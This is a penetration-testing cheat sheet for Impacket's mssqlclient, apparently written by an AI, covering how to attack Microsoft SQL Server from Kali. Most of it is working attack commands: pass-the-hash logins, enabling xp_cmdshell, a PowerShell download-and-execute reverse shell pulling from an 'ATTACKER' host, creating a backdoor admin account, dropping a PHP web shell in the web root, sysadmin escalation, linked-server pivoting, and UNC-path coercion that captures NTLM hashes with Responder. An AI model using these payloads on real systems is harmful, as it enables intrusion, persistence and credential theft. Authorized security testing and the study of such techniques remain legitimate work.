# mssqlclient

**Tags:** `#mssqlclient` `#impacket` `#mssql` `#sqlserver` `#database` `#postexploitation` `#windows`

Impacket's MSSQL client — connects to Microsoft SQL Server instances from Linux. Supports Windows auth (NTLM/Kerberos), SQL auth, and Pass-the-Hash. Beyond basic SQL queries, enables `xp_cmdshell` for OS command execution, file read/write, and linked server pivoting. Primary tool for MSSQL exploitation from Kali.

**Source:** Part of Impacket — pre-installed on Kali
**Install:** `pip install impacket`

```bash
# Windows auth
mssqlclient.py DOMAIN/user:Password@<target-ip> -windows-auth

# SQL auth
mssqlclient.py user:Password@<target-ip>
```

> [!note] **mssqlclient vs NetExec MSSQL** — NetExec (`netexec mssql`) is better for discovery and quick module execution across multiple targets. mssqlclient gives you an interactive SQL shell for manual exploitation, `xp_cmdshell`, and linked server abuse. Use NetExec to find and fingerprint, mssqlclient to exploit.

---

## Connecting

```bash
# Windows authentication (domain account)
mssqlclient.py DOMAIN/Administrator:Password@192.168.1.10 -windows-auth

# SQL Server authentication (local SQL user)
mssqlclient.py sa:Password@192.168.1.10

# Pass the Hash (Windows auth)
mssqlclient.py -hashes :NTLMhash DOMAIN/Administrator@192.168.1.10 -windows-auth

# Kerberos auth
KRB5CCNAME=ticket.ccache mssqlclient.py -k DOMAIN/user@mssql01.domain.local -windows-auth -no-pass

# Non-standard port
mssqlclient.py DOMAIN/user:Password@192.168.1.10:14330 -windows-auth

# Through proxy
proxychains mssqlclient.py DOMAIN/user:Password@192.168.1.10 -windows-auth
```

---

## Reconnaissance

```sql
-- Current user and role
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = yes

-- Server info
SELECT @@version;
SELECT @@servername;
SELECT @@servicename;

-- List databases
SELECT name FROM master.dbo.sysdatabases;

-- List tables in current DB
SELECT table_name FROM information_schema.tables;

-- List logins
SELECT name, type_desc, is_disabled FROM master.sys.server_principals WHERE type IN ('S','U');

-- Check for sysadmin accounts
SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Current database
SELECT DB_NAME();

-- Switch database
USE <database>;
```

---

## xp_cmdshell — OS Command Execution

Requires `sysadmin` role. Disabled by default — enable it via `sp_configure`.

```sql
-- Check if xp_cmdshell is enabled
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Run OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig /all';

-- Reverse shell — download and execute
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';

-- Add local admin
EXEC xp_cmdshell 'net user hacker Password123! /add && net localgroup administrators hacker /add';

-- Disable xp_cmdshell when done (OPSEC)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

---

## File Read / Write

```sql
-- Read a file (requires BULK INSERT permissions or sysadmin)
-- Method 1: OPENROWSET
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS data;

-- Method 2: BCP (requires xp_cmdshell)
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

-- Write a file (BULK INSERT / bcp)
EXEC xp_cmdshell 'echo [content] > C:\Windows\Temp\file.txt';

-- Write a web shell (if web root is known)
EXEC xp_cmdshell 'echo ^<^?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

---

## Privilege Escalation

```sql
-- Check current privileges
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('securityadmin');
SELECT IS_SRVROLEMEMBER('db_owner');

-- Impersonate another login (if IMPERSONATE granted)
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;    -- should show 'sa'
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Revert impersonation
REVERT;

-- db_owner to sysadmin via trustworthy DB
-- If current user is db_owner of a TRUSTWORTHY database:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS
  EXEC sp_addsrvrolemember 'DOMAIN\lowpriv', 'sysadmin';
EXEC sp_escalate;
```

---

## Linked Servers

SQL Server instances can be linked — exploit a lower-priv instance to reach a higher-priv one.

```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;

-- Run query on linked server
SELECT * FROM OPENQUERY("linked-server-name", 'SELECT @@version');
SELECT * FROM OPENQUERY("linked-server-name", 'SELECT SYSTEM_USER');

-- Check sysadmin on linked server
SELECT * FROM OPENQUERY("linked-server-name", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Enable xp_cmdshell on linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [linked-server-name];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [linked-server-name];
EXEC ('xp_cmdshell ''whoami''') AT [linked-server-name];

-- Chain through multiple linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [server2]') AT [server1];
```

---

## Credential Capture via UNC Path

Trigger an NTLM authentication to your Responder listener — captures the SQL service account hash.

```sql
-- Trigger UNC auth (Responder must be listening on ATTACKER)
EXEC xp_dirtree '\\ATTACKER\share';
EXEC xp_fileexist '\\ATTACKER\share\file';
EXEC xp_subdirs '\\ATTACKER\share';
```

```bash
# On Kali — catch the hash
sudo responder -I tun0
# or
sudo impacket-smbserver share $(pwd) -smb2support
```

---

## mssqlclient Shell Commands

These run directly in the mssqlclient interactive shell (not SQL):

```
help                    # show available commands
enable_xp_cmdshell      # shortcut to enable xp_cmdshell
disable_xp_cmdshell     # shortcut to disable
xp_cmdshell <cmd>       # run OS command directly
lcd <path>              # change local directory
lls                     # list local directory
exit
```

---

## OPSEC Notes

- `xp_cmdshell` execution is logged in SQL Server error log and Windows Application event log
- Login events generate Windows Security Event ID **4624** and SQL Server audit events
- UNC path coercion (`xp_dirtree`) generates outbound SMB — caught by network monitoring
- Service account running SQL Server is often over-privileged (Local System, Network Service, or a domain account) — `xp_cmdshell` commands run as that account

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
